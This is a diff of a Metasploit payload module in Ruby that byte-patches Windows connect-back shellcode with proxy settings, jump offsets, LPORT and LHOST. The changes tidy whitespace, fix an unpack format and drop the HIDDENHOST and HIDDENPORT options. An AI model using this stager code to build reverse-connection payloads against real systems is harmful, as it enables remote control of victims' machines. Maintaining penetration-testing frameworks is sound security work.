@@ -100,7 +100,7 @@ module Metasploit3
     p[proxyloc-4] = [calloffset].pack('V')[0]
 
     #Optional authentification
-    if 	(datastore['PROXY_USERNAME'].nil? or datastore['PROXY_USERNAME'].empty?) or
+    if (datastore['PROXY_USERNAME'].nil? or datastore['PROXY_USERNAME'].empty?) or
       (datastore['PROXY_PASSWORD'].nil? or datastore['PROXY_PASSWORD'].empty?) or
       datastore['PROXY_TYPE'] == 'SOCKS'
 
@@ -110,7 +110,7 @@ module Metasploit3
     else
       username_size_diff = 14 - datastore['PROXY_USERNAME'].length
       password_size_diff = 14 - datastore['PROXY_PASSWORD'].length
-      jmp_offset = 	16 + #PROXY_AUTH_START length
+      jmp_offset = 16 + #PROXY_AUTH_START length
           15 + #PROXY_AUTH_STOP length
           username_size_diff + # difference between datastore PROXY_USERNAME length  and db "PROXY_USERNAME length"
           password_size_diff   # same with PROXY_PASSWORD
@@ -129,14 +129,10 @@ module Metasploit3
     jmphost_loc = p.index("\x68\x3a\x56\x79\xa7\xff\xd5") + 8 # push 0xA779563A        ; hash( "wininet.dll", "InternetOpenA" ) ; call ebp
     p[jmphost_loc, 4] = [p[jmphost_loc, 4].unpack("V")[0] - jmp_offset].pack("V")
     #patch call Internetopen
-    p[p.length - 4, 4] = [p[p.length - 4, 4].unpack("l")[0] + jmp_offset].pack("V")
+    p[p.length - 4, 4] = [p[p.length - 4, 4].unpack("V")[0] + jmp_offset].pack("V")
 
     # patch the LPORT
-    unless datastore['HIDDENPORT'].nil? or datastore['HIDDENPORT'] == 0
-      lport = datastore['HIDDENPORT']
-    else
-      lport = datastore['LPORT']
-    end
+    lport = datastore['LPORT']
 
     lportloc = p.index("\x68\x5c\x11\x00\x00")  # PUSH DWORD 4444
     p[lportloc+1] = [lport.to_i].pack('V')[0]
@@ -146,11 +142,7 @@ module Metasploit3
 
     # append LHOST and return payload
 
-    unless datastore['HIDDENHOST'].nil? or datastore['HIDDENHOST'].empty?
-      lhost = datastore['HIDDENHOST']
-    else
-      lhost = datastore['LHOST']
-    end
+    lhost = datastore['LHOST']
     p + lhost.to_s + "\x00"
 
   end
@@ -161,5 +153,6 @@ module Metasploit3
   def wfs_delay
     20
   end
+
 end
 
